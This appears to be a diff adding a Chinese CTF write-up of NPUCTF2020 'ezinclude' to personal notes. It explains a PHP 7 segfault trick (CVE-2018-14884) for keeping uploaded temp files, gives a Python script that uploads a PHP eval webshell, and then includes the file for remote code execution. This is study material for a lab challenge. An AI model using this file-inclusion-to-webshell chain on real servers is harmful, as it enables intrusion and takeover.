@@ -4592,3 +4592,96 @@ for i in item:
    3. 看了wp才知道可以把一句话木马当成文件名，文件内容不用管，php被过滤，用短标签代替。
 
         **所以这里记录一下，我们上传的木马文件不知道在哪里但是后天日志文件保存了我们的文件名，而日志文件恰好是php文件，所以我们就可以把上传的文件名称改成一句话木马，一样可以起到木马的作用**
+
+## NPUCTF2020 ezinclude(php临时文件包含)
+
+-----
+**知识点--php7 segment fault特性(CVE-2018-14884)**
+
+引用自[PHP LFI 利用临时文件Getshell姿势](https://www.codenong.com/cs106498971/)
+
+>php代码中使用php://filter的 strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。
+
+>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，知道文件名就可以getshell。这个崩溃原因是存在一处空指针引用。向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留，临时文件会被保存在upload_tmp_dir所指定的目录下，默认为tmp文件夹。
+
+>该方法仅适用于以下php7版本，php5并不存在该崩溃。
+
+>利用条件：
+
+>php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复
+
+>php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复
+-----
+
+1. 源码中提示 `<!--md5($secret.$name)===$pass -->`,一开始以为是要找到secret但是搞了半天什么都没发现,bp抓包发现cookie的值是个哈希值。去解了一下，没发现有用的东西，看了wp，get传pass，值就是cookie中的hash。
+2. 在bp中请求，进入flflflflag.php页面,页面提示了一个`include($_GET['file'])`,典型的文件包含,就想到利用php伪协议读一下源码
+
+    flflflflag.php
+    ```php
+    <?php
+    $file=$_GET['file'];
+    if(preg_match('/data|input|zip/is',$file)){
+    die('nonono');
+    }
+    @include($file);
+    echo 'include($_GET["file"])';
+    ?>
+    ```
+    过滤了data和input
+
+    index.php
+    ```php
+    <?php
+    include 'config.php';
+    @$name=$_GET['name'];
+    @$pass=$_GET['pass'];
+    if(md5($secret.$name)===$pass){
+    echo '<script language="javascript" type="text/javascript">
+            window.location.href="flflflflag.php";
+    </script>
+    ';
+    }else{
+    setcookie("Hash",md5($secret.$name),time()+3600000);
+    echo "username/password error";
+    }
+    ?>
+    <html>
+    <!--md5($secret.$name)===$pass -->
+    </html>
+    ```
+
+    dir.php(第一步扫过网页目录，发现有这几个页面)
+    ```php
+    <?php
+    var_dump(scandir('/tmp'));
+    ?>
+    ```
+    打印临时文件夹中的内容，看网上的wp，说要利用这儿的东西获取flag。
+
+3. 接下来就要利用开头提到的知识点，临时文件Getshell
+
+    payload脚本
+    ```php
+    import requests
+    from io import BytesIO
+
+    payload = '<?php eval($_POST["cmd"]);?>'
+    data = {
+        'file': BytesIO(payload.encode())
+    }
+
+    url = 'http://7d61c871-f58e-4a45-826f-cd5228a013f7.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'
+
+    res = requests.post(url, files=data, allow_redirects=False).text
+
+    print(res)
+    ```
+
+    运行脚本后访问/dir.php,获得临时文件路径，接下来就可以蚁剑连接或者直接在bp里面请求(注意要用post传参，但是file参数要用get方式)。
+
+    蚁剑连接的url：
+    ```http
+    http://xxxx.buuoj.cn:81/flflflflag.php?file=/tmp/phpxxx
+    ```
+
+    这样操作会发现并没有真正的flag。根目录和项目目录下的flag都是假的，看了wp才知道flag放在phpinfo中，和之前遇到的某一到题目一样，flag都是在phpinfo()中。
